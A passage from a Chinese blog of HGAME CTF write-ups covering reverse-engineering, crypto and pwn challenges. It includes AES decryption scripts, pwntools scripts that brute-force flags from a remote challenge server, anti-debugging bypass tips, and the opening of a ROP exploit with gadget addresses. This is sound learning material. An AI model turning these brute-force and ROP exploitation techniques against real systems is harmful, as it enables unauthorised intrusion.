        <span class="token function">exchange_a_byte</span><span class="token punctuation">(</span>string_0<span class="token operator">+</span>v7<span class="token punctuation">,</span>string_0<span class="token operator">+</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>string_0 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>string_0<span class="token operator">+</span>v6<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>string_0<span class="token operator">+</span>v7<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token comment">//    for(int i = 0;i &lt; 256;i++)&#123;</span>
<span class="token comment">//        if(i%16 == 0 &amp;&amp; i!= 0)</span>
<span class="token comment">//            printf("\n");</span>
<span class="token comment">//        printf("%x ",string_0[i]);</span>
<span class="token comment">//    &#125;</span>

<span class="token comment">//    putchar('\n');</span>
<span class="token comment">//    for(int i = 0;i&lt;20;i++)&#123;</span>
<span class="token comment">//        printf("%x ",flag[i]);</span>
<span class="token comment">//    &#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02d "</span><span class="token punctuation">,</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//HGAME&#123;6-K4K.4R+3C4T&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>在这个题目中也有很多可以讨论的地方，比如在TLS函数中可以做手脚，检测int断点等等，对于dump那块内存最稳妥的办法是修改程序流，似乎可以用dll注入的方法，不过那个徒手操作确实比较复杂到现在我也掌握的不好（老是算错地址。。。）在WndProc中我们也可以看到其中对输入的一些操作，但是我终究不清楚它的WM_COMMOND跑哪去了，那些按钮究竟在哪实现的，这点很奇怪。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe35.jpg" alt="5"></p>
<p>我还找到了另外的一个switch分支<em><strong>sub_1401CC620</strong></em>，但是很迷惑，只是经过动态调试知道了它在按钮按下的时候走的default路线。在其中还有对xmm0，xmm1这些寄存器的操作，应该是经过优化后得到的结果。</p>
<p>mark：rep stosb就是从EDI所指的内存开始，将连续的ECX个字节写成AL的内容，多用于清零等，每次遇到这个都会忘，然后重新查，就像movsx，movss这些指令一样。</p>
<p>还有一点，程序中很容易产生[addr] &#x3D; ??? 也就是地址写入的时候出异常，这种时候x64dbg可以用shift+f9忽略异常，也可以在选项中直接把对应异常的代码忽略掉（建议这样做）</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>和之前一样,,,这算是白嫖flag嘛,,,都有点不好意思了</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa1.jpg" alt="2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/rsa2.jpg" alt="1"></p>
<p>不过那个网站也分出了素数</p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME_WEEK2_WP</title>
    <url>/2021/03/14/HGAME_WEEK2_WP/</url>
    <content><![CDATA[<h2 id="WEEK2-WriteUp"><a href="#WEEK2-WriteUp" class="headerlink" title="WEEK2-WriteUp"></a>WEEK2-WriteUp</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="ezapk"><a href="#ezapk" class="headerlink" title="ezapk"></a>ezapk</h4><p>为了做这个题目我找了好多好多工具ToT</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/week2-1.jpg" alt="jpg"></p>
<p>最后免费的我推荐jadx 或者jeb demo。不过jadx有些地方还是反编译不出来，很难看懂，似乎是和类型有关的部分。最后一个能打的都没有，最后跑去找到了 jeb pro用。相当的给力，虽然这道题理论上可以看字节码，也有教程讲java的字节码，但是——正经人谁看字节码呀！</p>
<p>在付费面前，一个能打的都没有&#x2F;doge(</p>
<p>在逆的过程中找到“Again?”字符串，定位到button的方法上</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/QQ%E6%88%AA%E5%9B%BE20210210003528.jpg" alt="QQ截图20210210003528"></p>
<p>经过一番调教，找到MainActivity.s是一个加密函数，继续挖掘。找到</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/s.jpg" alt="s"></p>
<p>用的AES-CBC，key是SHA-256(“A_HIDEN_KEY”)，IV是MD5(“A_HIDEN_KEY”)，上脚本咯</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> absolute_import<span class="token punctuation">,</span> division<span class="token punctuation">,</span> unicode_literals
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify
<span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">aes_encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span>_IV<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> _IV<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">aes_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span>_IV<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> _IV<span class="token punctuation">)</span>
    <span class="token keyword">return</span> cryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    key     <span class="token operator">=</span> <span class="token string">b'A_HIDDEN_KEY'</span>
    flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">b'EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY'</span><span class="token punctuation">)</span>
    sec_key <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    _IV     <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key : "</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sec_key : "</span><span class="token punctuation">,</span>sec_key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"_IV : "</span><span class="token punctuation">,</span>_IV<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag : "</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
    content <span class="token operator">=</span> aes_decrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>sec_key<span class="token punctuation">,</span>_IV<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>其实这道题可以再混淆一下，不过毕竟是ezapk，首次接触确实头疼，还有加壳的，基本套路应该和pe的一些操作类似。</p>
<h4 id="helloRe2"><a href="#helloRe2" class="headerlink" title="helloRe2"></a>helloRe2</h4><p>这道题有几个点我新见到的，一个是Open-Maping，似乎是可以共享一段内核内存的，可以用于进程间的通信，和tube有点像。之所以卡了很久是因为严重睡眠不足（哇我函数参数看歪了直接进行一个调试的重新）动态调试用的x32dbg，找到了一个childProcess的插件，在createProcess的时候可以调试产生的进程，不过似乎是在ResumeThread和Sleep执行完了之后，这里也不清楚为什么，挖了一个坑。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">OpenFileMappingA  <span class="token comment">//这个函数只有在 CreateFileMappingA 之后才能有效调用，因此第一个函数没有成果，其子进程在父进程调用了CreateFileMappingA之后才调用成果进入了password2</span>
MapViewOfFile
IsDebuggerPresent <span class="token comment">//这个算很常见了，一般都要在导入函数里面看一下，有的话要么调试的时候改一下flag，要么直接把这个函数nop掉，然后eax = 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p>这里涉及了SSE2指令，可以说又是我的知识盲区了，不过查一下也挺快，这个指令还挺好用的来着。</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa  xmm0, xmmword_4043A0
pcmpeqb xmm0, ds:xmmword_4030F0
pmovmskb eax, xmm0
cmp     ax, 0FFFFh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<p>第一个password很好找到的，动态调试到上面这段，翻一下内存，啪的一下，他就出来了。</p>
<p>第二个password就麻烦了，虽然从以下第一个函数中能得到是AES，其实这样就简单了，不过我的睡眠困乏犯了，参数看错位置，直接进行一个时间的浪费。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">BCryptOpenAlgorithmProvider</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span><span class="token string">"AES"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
BCryptSetProperty
BCryptGetProperty
BCryptGenerateSymmetricKey
BCryptExportKey
BCryptEncrypt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>可气的是<strong>BCryptEncrypt</strong>调用了两次，没仔细看直接上当，第一个只是为了获取长度，第二个则是加密，找到参数，翻翻内存，就找到了。这里对BCryptExportKey直接选择性忽略，<strong>我看不见，我看不见！</strong>（其实我纠结了好久，看了好几次文档，为什么这么复杂呢，可能是因为为了保证传输时候的安全性）最后上脚本。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#python3</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> base64

BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size  <span class="token comment"># 这个等于16</span>
mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span>BS<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"\0"</span>  <span class="token comment"># 用于补全key</span>
<span class="token comment"># 用于补全下面的text，上面两个网址就是用以下形式补全的</span>
pad_txt <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span>
unpad <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

key <span class="token operator">=</span> <span class="token string">'\x32\x63\x32\x60\x31\x60\x30\x66\x3B\x68\x38\x3B\x6E\x3C\x36\x36'</span> <span class="token comment"># the length can be (16, 24, 32)  # key</span>
text <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/'</span>  <span class="token comment"># 加密文本</span>
vi <span class="token operator">=</span> <span class="token string">'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'</span>   <span class="token comment"># 偏移量</span>

cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> vi<span class="token punctuation">)</span>
encrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad_txt<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#通过aes加密后，再base64加密</span>
encrypted <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>

encrypted <span class="token operator">=</span> b'\xB7\xFE\xFE\xD9\x07\x76\x79\x65\x3F\x4E\
                \x5F\x62\xD5\x02\xF6\x7E\x32\x62\x30\x63\
                \x35\x65\x36\x61\x33\x61\x32\x30\x62\x31\x38\x39'
cryptor<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span>mode<span class="token punctuation">,</span> vi<span class="token punctuation">)</span>
<span class="token comment"># 解密，解密后text文本会包含用来补全的字符</span>
plain_text  <span class="token operator">=</span> cryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><img src="file:///D:/HGAME/week2/2-re/shared-memory/QQ%E6%88%AA%E5%9B%BE20210208153451.jpg" alt="QQ截图20210208153451"></p>
<p>这个明文也是稀奇古怪，后面一段啥也不知道。结果只取的前面2333.</p>
<h4 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h4><p>写着debugger但我觉得应该是一个内敛汇编，用于输出当时的eax，ebx，ecx，zf等值。每一个ecx标志着一个循环下，eax应该是函数返回值，第一个ebx应该是加密时泄露的值，第二个ebx时要比较时从flag那取出来的。由此可知道flag[i] &#x3D; ebx[-1]^ebx[-2]</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">burp</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>times<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> text
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.132.177.131"</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>string<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">" \n"</span><span class="token operator">*</span>times<span class="token punctuation">)</span>
    text <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    <span class="token comment">#print(text)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> <span class="token string">"ebx: (\d&#123;1,4&#125;)"</span>
    <span class="token comment">#string = "hgame&#123;You_K"</span>
    string <span class="token operator">=</span> <span class="token string">""</span>
    append <span class="token operator">=</span> <span class="token string">""</span>

    times <span class="token operator">=</span> <span class="token number">2</span>
    text <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        burp<span class="token punctuation">(</span>string <span class="token operator">+</span> append <span class="token operator">+</span> <span class="token string">"**************"</span><span class="token punctuation">,</span>times<span class="token punctuation">)</span>
        ebx_list <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>ebx_list<span class="token punctuation">)</span>
        <span class="token keyword">if</span> ebx_list<span class="token punctuation">:</span>
            append <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ebx_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>ebx_list<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>string <span class="token operator">+</span> append<span class="token punctuation">)</span>
        times <span class="token operator">+=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>一开始我试着爆破，但是爆破了几位后就容易挂，也不清楚为什么，这里我也留个脚本，万一什么时候就用上了{doge}</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">def</span> <span class="token function">burp</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>times<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> text
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.132.177.131"</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>string<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">" \n"</span><span class="token operator">*</span>times<span class="token punctuation">)</span>
    text <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> <span class="token string">"eax: \d&#123;1,4&#125;\nebx: \d&#123;1,4&#125;\necx: (\d&#123;1,3&#125;)\nzf: 1\n--------------INFO--------------\nWrong Flag! Try again!\n"</span>
    key <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'~!@#$%^&amp;*()_+-=;&lt;>?\\|\"\''</span>
    string <span class="token operator">=</span> <span class="token string">"hgame&#123;Yo"</span>
    append <span class="token operator">=</span> <span class="token string">""</span>

    i <span class="token operator">=</span> <span class="token number">0</span>
    times <span class="token operator">=</span> <span class="token number">20</span> 
    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    text <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        burp<span class="token punctuation">(</span>string<span class="token operator">+</span>append<span class="token operator">+</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"aaaaaa"</span><span class="token punctuation">,</span>times<span class="token punctuation">)</span>
        ecx_list <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>ecx_list<span class="token punctuation">,</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>string<span class="token operator">+</span>append<span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> ecx_list<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n***"</span><span class="token punctuation">,</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"***"</span><span class="token punctuation">)</span>
            append <span class="token operator">+=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            times <span class="token operator">+=</span> <span class="token number">2</span>
            i <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">continue</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="rop-primary"><a href="#rop-primary" class="headerlink" title="rop_primary"></a>rop_primary</h4><p>先是一个矩阵乘法，再是一个read溢出，在read上搞事情。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> numpy
<span class="token keyword">import</span> re

io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"159.75.104.107"</span><span class="token punctuation">,</span><span class="token number">30372</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a * b = ?\n"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
matrix_A_data <span class="token operator">=</span> data<span class="token punctuation">[</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"A:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"B:"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
matrix_B_data <span class="token operator">=</span> data<span class="token punctuation">[</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"B:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"a * b = ?\n"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
matrix_A <span class="token operator">=</span> numpy<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>matrix_A_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t\n'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
matrix_B <span class="token operator">=</span> numpy<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>matrix_B_data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t\n'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
matrix_C <span class="token operator">=</span> numpy<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>matrix_A<span class="token punctuation">,</span>matrix_B<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>size<span class="token punctuation">(</span>matrix_C<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>numpy<span class="token punctuation">.</span>size<span class="token punctuation">(</span>matrix_C<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>matrix_C<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#0x0000000000401613 : pop rdi ; ret</span>
<span class="token comment">#0x0000000000401611 : pop rsi ; pop r15 ; ret</span>
<span class="token comment">#0x00000000004011ad : pop rbp ; ret</span>
rsi_ch <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401611</span><span class="token punctuation">)</span>
rdi_ch <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401613</span><span class="token punctuation">)</span>
rbp_ch <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4011ad</span><span class="token punctuation">)</span>
read   <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401080</span><span class="token punctuation">)</span>
open_  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4010A0</span><span class="token punctuation">)</span>
puts   <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x401040</span><span class="token punctuation">)</span>
